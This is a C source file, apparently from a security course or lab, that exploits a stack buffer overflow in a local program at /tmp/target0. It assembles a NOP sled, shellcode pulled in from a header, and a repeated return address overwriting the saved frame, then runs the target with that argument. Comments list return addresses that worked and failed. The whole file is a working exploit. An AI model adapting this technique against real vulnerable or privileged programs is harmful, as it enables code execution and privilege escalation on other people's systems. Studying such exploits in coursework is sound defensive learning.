#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[408];
  memset(str, 0, 408);

  // `perl -e 'print "\x90"x203';`
  for (int i = 0; i < 203; ++i)
  {
  	strcat(str, "\x90");
  }

  // `cat sc`
  strcat(str, shellcode);

  // `perl -e 'print"\xf8\xf2\xff\xbf"x38' the return address
  for (int i = 0; i < 38; ++i)
  {
    // Anything from 0xbffffb30 to 0xbffffbf0 should work
    // the return address should point to the \x90
    // below the shellcode
    // above the EBP
    strcat(str, "\x80\xfb\xff\xbf");
  	// strcat(str, "\x2c\xfb\xff\xbf");
  	// strcat(str, "\x20\xfb\xff\xbf");

    // 0x90 inside higher bound
  	// strcat(str, "\xf0\xfb\xff\xbf");

    // 0x90 inside lower bound
    // strcat(str, "\x30\xfb\xff\xbf");
    // strcat(str, "\xf7\xfc\xff\xbf");
    // failed

    // 0x90 outside higher bound
    // strcat(str, "\x00\xfc\xff\xbf");
    // strcat(str, "\xfc\xfb\xff\xbf");
    // 0x90 outside lower bound
    // strcat(str, "\x10\xfb\xff\xbf");
    // strcat(str, "\x2a\xfb\xff\xbf");


  }
  args[0] = TARGET;
  args[1] = str;
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

